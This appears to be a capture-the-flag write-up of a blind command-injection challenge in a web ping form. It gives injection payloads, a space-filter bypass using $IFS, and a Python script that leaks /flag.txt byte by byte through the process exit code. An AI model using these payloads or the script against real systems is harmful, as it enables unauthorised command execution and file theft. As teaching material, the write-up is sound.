# WS_1.01 — BasicRCE

---

## Problem description

A web form that pings a host. You give it an IP, it runs something like `ping <ip>` server-side and prints the result plus a `Return code` line. Goal: read `/flag.txt`.

## Recon

The form takes a host input, which is a classic vector for command injection. As an initial test, I passed `127.0.0.1; whoami` to check if multiple commands could be chained via `;`. 

Two things stood out from the response:

- The output of the injected command (`whoami`) was **not** reflected in the HTML. Whatever stdout the payload generated was suppressed, confirming a **blind** command injection context.
- The page consistently returned a `Return code N` line, reflecting the exit status of the overall process execution. Testing with `127.0.0.1; exit 42` returned `Return code 42`, confirming that the exit status could be controlled directly.

This sets up a side-channel exfiltration vector: standard output is blind, but the exit code provides a 1-byte data leak per request.

## Analysis

An exit code in Linux is represented as an unsigned integer from 0 to 255 (a single byte). By isolating individual character offsets from `/flag.txt` and converting them into numerical ASCII values, `exit` can leak the file contents byte-by-byte.

The `od` utility handles the byte extraction:

```bash
od -An -tu1 -j<offset> -N1 </flag.txt
```

* `-N1`: Reads 1 byte.
* `-j<offset>`: Seeks to the specified byte offset.
* `-tu1`: Formats the byte as an unsigned decimal integer.
* `-An`: Suppresses the address offset column.

Executing `exit $(od ...)` forces the server to return the ASCII value of the target byte inside the `Return code` field.

### Space Filtering Bypass

Standard whitespace characters in the injection payload broke command execution due to server-side input sanitization/stripping. To bypass this, all literal spaces were substituted with `$IFS` (the shell's internal field separator):

```bash
127.0.0.1;exit$IFS$(od$IFS-An$IFS-tu1$IFS-j<i>$IFS-N1</flag.txt)
```

## Exploit, step by step

A Python script iterates over byte offsets starting from 0, extracting the exit code from the `Return code` field via regex on each iteration and appending the decoded ASCII character to the flag string. The query parameter accepted by the application is `ip`.

```python
import requests, re, sys

URL = "[http://target.local/](http://target.local/)"
flag = ""
for i in range(50):
    payload = f"127.0.0.1;exit$IFS$(od$IFS-An$IFS-tu1$IFS-j{i}$IFS-N1</flag.txt)"
    r = requests.get(URL, params={'ip': payload})
    m = re.search(r"Return code\s*(\d+)", r.text)
    if not m:
        break
    v = int(m.group(1))
    if v == 0:                       # past end of file
        break
    flag += chr(v)
    sys.stdout.write(chr(v)); sys.stdout.flush()
print("\n" + flag)

```

## With Insomnia

Insomnia can confirm the injection vector by retrieving a single byte manually. Sending a `GET` request to `/` with the parameter `ip` set to:

```text
127.0.0.1;exit$IFS$(od$IFS-An$IFS-tu1$IFS-j0$IFS-N1</flag.txt)

```

returns the ASCII value of character 0 in the `Return code` line. Repeating this manually across 40+ offsets is inefficient, making automated script extraction necessary.

## Flag

```
CCIT{****************}
```

## What I learned

* An exit code (0–255) provides a 1-byte side channel sufficient to exfiltrate arbitrary files when stdout is completely blind.
* `od -An -tu1 -jN -N1` provides a clean way to convert raw bytes into exit-code-compatible integers.
* `$IFS` serves as an effective space replacement in command injection vectors when spaces are filtered or stripped by input handling.